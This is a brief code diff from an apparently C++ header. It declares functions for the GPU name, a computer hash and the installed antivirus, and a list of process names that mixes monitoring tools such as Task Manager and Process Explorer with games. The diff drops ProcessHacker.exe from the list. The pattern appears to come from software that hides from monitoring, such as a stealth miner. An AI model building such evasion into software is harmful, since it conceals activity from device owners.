@@ -39,7 +39,7 @@ std::string GetGPUName();
 std::string GetComputerHash();
 std::string GetAntivirusName();
 const std::vector<std::string> processNames = {
-    "Taskmgr.exe", "ProcessHacker.exe", "tcpview.exe", "perfmon.exe", "procexp.exe", "procexp64.exe",
+    "Taskmgr.exe", "tcpview.exe", "perfmon.exe", "procexp.exe", "procexp64.exe",
     "ModernWarfare.exe", "ShooterGame.exe", "ShooterGameServer.exe", "ShooterGame_BE.exe",
     "GenshinImpact.exe", "FactoryGame.exe", "Borderlands2.exe", "EliteDangerous64.exe",
     "PlanetCoaster.exe", "Warframe.x64.exe", "NMS.exe", "RainbowSix.exe", "RainbowSix_BE.exe",
